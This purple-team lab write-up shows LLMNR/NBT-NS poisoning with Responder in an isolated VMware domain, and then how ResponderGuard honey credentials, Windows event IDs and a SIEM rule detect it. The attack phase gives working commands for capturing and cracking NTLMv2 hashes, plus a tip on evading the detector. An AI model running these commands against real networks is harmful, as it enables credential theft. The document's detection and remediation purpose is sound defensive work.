# Burying Responder in 2026: LLMNR Poisoning, Honey Credentials & Full Telemetry Chain

> *A purple team lab demonstrating LLMNR/NBT-NS poisoning attack and detection using honey credentials and Windows event telemetry.*

---

## Overview

Responder has been capturing domain credentials via LLMNR and NBT-NS poisoning since 2012. The detection tooling to catch it has existed almost as long. This lab demonstrates the complete attack and defence cycle end-to-end, including the full Windows event telemetry chain across victim host and domain controller.

**The point:** the attack is trivial. The detection is equally trivial. The only reason this still works in production environments is that LLMNR and NBT-NS — protocols that should have been retired from most enterprise networks years ago — remain enabled by default and hardening gets deferred.

---

## Lab Environment

| Host | OS | IP | Role |
|---|---|---|---|
| Kali | Kali Linux | 172.16.61.129 | Attacker — Responder |
| WEB01B | Windows Server 2019 | 172.16.61.146 | Victim — domain joined, runs ResponderGuard |
| DC01 | Windows Server 2019 | 172.16.61.155 | Domain Controller — lab2019.local |

All VMs on a VMware NAT segment (`172.16.61.0/24`).

---

## Phase 1: The Attack

### Prerequisites
- Kali on the same network segment as Windows hosts
- LLMNR and NBT-NS enabled (Windows default)
- Responder installed (included in Kali by default)

### Step 1 — Start Responder

```bash
sudo responder -I eth0 -wv
```

Responder listens on all relevant protocols: LLMNR, mDNS, NBT-NS, SMB.

### Step 2 — Trigger LLMNR Broadcast from Victim

On WEB01B, browse to a nonexistent UNC path:

```cmd
net use \\doesnotexist\share /user:lab2019\Administrator wrongpassword
```

Windows cannot resolve `doesnotexist` via DNS, falls back to LLMNR broadcast. Responder poisons the response and captures the NTLM challenge/response.

### Step 3 — Hash Captured

```
[SMB] NTLMv2-SSP Client   : 172.16.61.146
[SMB] NTLMv2-SSP Username : lab2019\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::lab2019:23d685dbc12cfcc4:[TRUNCATED]
```

### Step 4 — Crack the Hash

```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.61.146.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 5600 [hashfile] --show
```

Result: `Administrator::<REDACTED>`

**Note:** Never publish cracked passwords, even from lab environments. Redact all credentials before sharing logs or screenshots.

---

## Phase 2: The Defence

### Tool

**ResponderGuard** — part of the CredDefense Toolkit by Black Hills Information Security.

> Source: [https://github.com/CredDefense/CredDefense](https://github.com/CredDefense/CredDefense)  
> Author: Beau Bullock (@dafthack)  
> License: MIT

### How It Works

ResponderGuard runs as a background agent on a domain-joined host. It periodically sends fake NBNS/LLMNR/mDNS name resolution requests for random nonexistent hostnames. If any host on the segment answers — that host is a spoofer. When detected, ResponderGuard can:

1. Log **Event ID 8415** to the Windows Application log
2. Deliberately submit **honey credentials** to the spoofer over SMB

The honey credentials use a real AD account with a strong actual password, but a deliberately weak bait password in the script. When the attacker cracks the bait hash and attempts to authenticate, the DC fires the final trip wire.

### Telemetry Setup

#### On DC01 — Enable Audit Policy

```cmd
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

#### On WEB01B — Enable Audit Policy + Event Source

```cmd
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
```

```powershell
New-EventLog -LogName Application -Source "ResponderGuard" -ErrorAction SilentlyContinue
```

### Honey Account Setup

Create a real AD account on DC01:

```powershell
New-ADUser -Name "svc_backup" `
  -SamAccountName "svc_backup" `
  -AccountPassword (ConvertTo-SecureString "Str0ngRealP@ss!" -AsPlainText -Force) `
  -Enabled $true `
  -PasswordNeverExpires $true
```

The account's **real password is strong** — not in any wordlist. The script submits a **weak bait password** (`Summer2026`) which the attacker can crack. When they try to use the cracked password against the DC, authentication fails and the DC logs the attempt.

### Running ResponderGuard

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. C:\Users\Administrator\Downloads\ResponderGuard.ps1
Invoke-ResponderGuard -CidrRange 172.16.61.0/24 -LoggingEnabled -HoneyTokenSeed
```

**ResponderGuard output:**

```
[*] Setting up event logging.
[*] EventLog source ResponderGuard already exists.
[*] Now creating a list of IP addresses from the 172.16.61.0/24 network range.
[*] A list of 255 addresses was created.
[*] ResponderGuard received an NBNS response from the host at 172.16.61.129 for the hostname YQFPBEWKOA!
[*] An event was written to the Windows Event log.
[*] Submitting Honey Token Creds svc_backup : Summer2026 to \\172.16.61.129\c$!
```

---

## Phase 3: Full Telemetry Chain

### WEB01B — Application Log (Event 8415)

```powershell
Get-EventLog -LogName Application -Source "ResponderGuard" -Newest 5 | Format-List
```

```
InstanceId  : 8415
Message     : An NBNS spoofer was discovered at 172.16.61.129.
Source      : ResponderGuard
TimeGenerated : 3/9/2026 4:11:59 PM
```

Attacker IP logged immediately on detection.

### WEB01B — Security Log (Event 4648)

```powershell
Get-EventLog -LogName Security -InstanceId 4648 -Newest 5 | Format-List
```

```
InstanceId  : 4648
Message     : A logon was attempted using explicit credentials.

Account Whose Credentials Were Used:
    Account Name: svc_backup

Target Server:
    Target Server Name: BLXZ.LOCAL        ← Responder's fake domain — tells you it's Responder

Network Information:
    Network Address: 172.16.61.129
    Port: 445

TimeGenerated : 3/9/2026 4:14:16 PM
```

Note: `BLXZ.LOCAL` is Responder's randomly generated domain name for this session — a useful IOC confirming the target server is a rogue listener.

### DC01 — Security Log (Event 4776)

```powershell
Get-EventLog -LogName Security -InstanceId 4776 -Newest 5 | Format-List
```

```
InstanceId  : 4776
Message     : The computer attempted to validate the credentials for an account.

Logon Account:  svc_backup
Error Code:     0xc000006a     ← Wrong password — bait hash cracked and used
TimeGenerated : 3/9/2026 4:21:18 PM
```

### DC01 — Security Log (Event 4625)

```powershell
Get-EventLog -LogName Security -InstanceId 4625 -Newest 5 | Format-List
```

```
InstanceId  : 4625
Message     : An account failed to log on.

Account Name:           svc_backup
Account Domain:         lab2019.local
Failure Reason:         %%2313
Status:                 0xc000006d
Sub Status:             0xc000006a

Source Network Address: 172.16.61.129    ← Attacker IP on the DC log
Source Port:            36040
Authentication Package: NTLM
TimeGenerated : 3/9/2026 4:21:18 PM
```

---

## Complete Kill Chain Summary

| Timestamp | Event ID | Host | Meaning |
|---|---|---|---|
| 4:05-4:14 PM | 8415 | WEB01B App Log | Responder detected at 172.16.61.129 |
| 4:05-4:14 PM | 4648 | WEB01B Security | Honey creds `svc_backup` submitted to attacker |
| 4:21 PM | 4776 | DC01 Security | DC: credential validation for `svc_backup` failed |
| 4:21 PM | 4625 | DC01 Security | Failed logon from **172.16.61.129** — attacker IP confirmed |

Attacker IP `172.16.61.129` appears in both WEB01B and DC01 logs, correlated by the `svc_backup` account. This is your SIEM detection rule.

---

## SIEM Correlation Rule (Pseudo)

```
IF EventID = 8415 AND Source = "ResponderGuard"
  CORRELATE WITH EventID = 4648 AND AccountName = <honey_account> WITHIN 5 minutes
  CORRELATE WITH EventID = 4625 AND AccountName = <honey_account> AND SourceIP = <detected_spoofer_ip>
THEN ALERT: "LLMNR poisoning attack confirmed — attacker at <SourceIP>"
```

---

## Limitations & Notes

**Known false positive:** ResponderGuard may flag the broadcast address (`172.16.61.255`) as a spoofer. Filter this in production.

**Detection evasion:** A cautious attacker running Responder in analyse mode (`-A`) first will see ResponderGuard's fake NBNS probes and identify the detection tool before poisoning. Vary the probe hostname and timing to reduce this risk.

**Scope:** ResponderGuard detects NBNS spoofers. LLMNR and mDNS detection requires the updated `ResponderGuardAgent` variant from the repo.

**Why the attack still works in 2026:** LLMNR (`MS-LLMNR`) and NBT-NS are enabled by default on all Windows versions. Disabling them requires deliberate GPO action. The attack surface isn't a zero-day — it's a 17-year-old default configuration that in many environments has simply never been addressed.

---

## Remediation

**Kill the attack at source — disable LLMNR and NBT-NS via GPO:**

```
Computer Configuration → Administrative Templates → Network → DNS Client
→ Turn off multicast name resolution = Enabled

Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options  
→ Network security: Restrict NTLM: Incoming NTLM traffic = Deny All
```

For NBT-NS, disable via NIC properties or registry:

```powershell
# Disable NBT-NS on all adapters
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)
}
```

**Then add honey credentials as a second layer** — even on hardened networks, detection depth matters.

---

## Credits

- **ResponderGuard / CredDefense Toolkit** — Beau Bullock (@dafthack), Black Hills Information Security — [https://github.com/CredDefense/CredDefense](https://github.com/CredDefense/CredDefense)
- **Responder** — Laurent Gaffie — [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

---

*Lab built on VMware Workstation. All credentials used are lab-only and have been redacted from this writeup.*
